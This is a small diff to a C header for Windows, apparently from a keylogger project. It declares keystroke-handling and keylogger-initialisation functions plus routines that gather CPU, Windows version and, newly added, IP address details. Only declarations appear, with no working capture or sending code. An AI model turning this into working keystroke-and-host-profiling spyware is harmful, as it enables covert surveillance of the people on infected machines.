@@ -5,7 +5,6 @@
 
 typedef LONG (WINAPI *RtlGetVersionPtr)(PRTL_OSVERSIONINFOW);
 
-
 #define _WIN32_WINNT 0x0A00
 
 typedef struct s_key {
@@ -26,6 +25,7 @@ typedef struct s_key {
 int		handleKeyPress(t_key *keyData);
 void	initKeylogger(t_key *keyData);
 
+void get_ip_address(void);
 void get_cpu_info(void);
 void get_windows_info(void);
 
